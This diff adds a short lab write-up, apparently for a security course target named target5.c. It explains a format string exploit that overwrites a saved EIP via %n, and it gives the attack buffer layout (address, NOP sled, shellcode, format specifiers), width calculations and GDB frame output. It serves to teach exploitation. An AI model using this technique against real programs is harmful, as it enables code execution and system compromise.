@@ -1,0 +1,24 @@
+## General Idea of Exploitation
+Use string format vulnerability to write abitary memory location (here saved EIP).
+
+## Step
+- Use fix input buffer size 480; Write sample code to generate buffer and execute the target program
+- Find out the address of saved EIP (`0xbffffc9c`), address of the buffer (`0xbffffab8`)
+- Attack Buffer structure: [addrEIP][NOP]...[NOP][shellcode]...[shellcode]["%u%u%(n)u%n"]
+- First we set the `addrEIP` be the address of buffer and try how many %u we need to get the current stack value for printf -> three %u
+- Set the `addrEIP` to the address EIP and adjust the width of third %u so that %n will write the address of the attack buffer into EIP: `0xbffffab8 + 4 =  0xbffffabc = 3221224124`
+- `3221224124` is too large for width, so we change it to the first three bytes of address `bffffc` and find the appropriate width 12582442. Change the addrEIP to be `0xbffffc9c+1` so that only top three bytes will be overwritten.
+
+
+## GDB command result
+```
+(gdb) info frame
+Stack level 0, frame at 0xbffffca0:
+ eip = 0x804843d in foo (target5.c:8); saved eip 0x80484c1
+ called by frame at 0xbffffcc0
+ source language c.
+ Arglist at 0xbffffc98, args: arg=0xbffffe0f "\021\021\021\021", '\220' <repeats 196 times>...
+ Locals at 0xbffffc98, Previous frame's sp is 0xbffffca0
+ Saved registers:
+  ebp at 0xbffffc98, eip at 0xbffffc9c
+```
